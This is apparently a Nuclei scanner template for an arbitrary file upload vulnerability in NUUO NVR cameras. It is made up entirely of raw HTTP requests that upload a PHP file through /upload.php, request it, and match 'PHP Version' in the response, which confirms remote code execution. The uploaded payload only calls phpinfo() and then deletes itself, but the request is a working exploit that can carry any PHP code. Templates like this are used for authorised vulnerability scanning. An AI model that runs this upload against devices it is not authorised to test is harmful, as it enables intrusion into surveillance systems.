id: NUUO-NVR-upload
info:
  name: NUUONVR摄像头存在任意文件上传漏洞
  author: NUUO
  severity: high
  description: upload
 

http:
  - raw:
      - |   
          POST /upload.php HTTP/1.1
          Host: {{Hostname}}
          Accept-Encoding: gzip, deflate
          Accept: */*
          Accept-Language: en
          User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
          Connection: close
          Content-Type: multipart/form-data; boundary=--------969849961
          Content-Length: 157

          ----------969849961
          Content-Disposition: form-data; name="userfile"; filename="nuuonvr.php"

          <?php phpinfo();@unlink(__FILE__);?>
          ----------969849961--

      - |    
          GET /nuuonvr.php HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4103.116 Safari/537.36
          Accept-Encoding: gzip, deflate
          Accept: */*
          Connection: keep-alive

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body,"PHP Version")'